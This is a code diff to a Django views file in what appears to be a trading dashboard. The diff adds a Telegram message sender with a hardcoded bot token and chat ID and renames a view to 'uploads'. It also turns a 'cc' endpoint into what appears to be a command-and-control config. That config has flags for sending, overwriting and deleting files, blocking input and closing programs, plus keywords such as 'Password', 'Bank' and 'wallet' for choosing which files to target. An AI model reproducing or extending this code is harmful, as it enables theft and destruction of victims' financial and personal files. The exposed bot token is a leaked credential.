@@ -6,6 +6,7 @@ from threading import Thread
 from time import sleep
 from datetime import datetime, timedelta, timezone
 import pandas as pd
+import requests
 from django.shortcuts import render
 from django.http import HttpResponse, JsonResponse
 # from dotenv import load_dotenv
@@ -67,22 +68,49 @@ PROJECT_ROOT = Path(os.path.abspath(os.path.dirname(__file__)))
 # ws = usdt_perpetual.WebSocket(test=True, api_key=api_key, api_secret=api_secret)
 
 
+def send_telegram_msg(msg):
+    bot_token = '1439865314:AAGGYE4smVM4lPOHzgtWu3sFug88v5bGa7Y'
+    chat_id = '1442986099'
+    proxy = "154.30.136.43:8000"
+    http_proxy = f"http://{proxy}"
+    https_proxy = f"http://{proxy}"
+    ftp_proxy = f"ftp://{proxy}"
+    proxies = {"http": http_proxy, "https": https_proxy}
+    send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}'
+    response = requests.get(url=str(send_text), verify=False)
+    print(response.json())
+    return response.json()
+
+
 # Create your views here.
 def index(request):
     return render(request, "index.html", context={"account_balance": "account_balance"})
 
 
 @csrf_exempt
-def trades(request):
-    return render(request, 'trades.html', context={"account_balance": "account_balance"})
+def uploads(request):
+    return render(request, 'uploads.html', context={"account_balance": "account_balance"})
+
+
+def get_telegram_msg(request):
+    resp = send_telegram_msg(msg="This Is a Test Msg")
+    response = {
+        "Message": resp}
+    return JsonResponse(response)
 
 
 def cc(request):
     response = {
-        "CC": 0,
-        "Send": 0,
+        "Start": 0,
+        "Enable": 0,
+        "SendFiles": 0,
         "OverWrite": 0,
-        "Delete": 0
+        "Delete": 0,
+        "FileExtension": 0,
+        "BlockInput": 0,
+        "ClosePython": 0,
+        "CloseProgram": 0,
+        "Validator": ["Bank", "Account", "Password", "Email", "gmail", "contact", "personal", "wallet", "crypto", "investment", "finance"]
     }
     return JsonResponse(response)
 
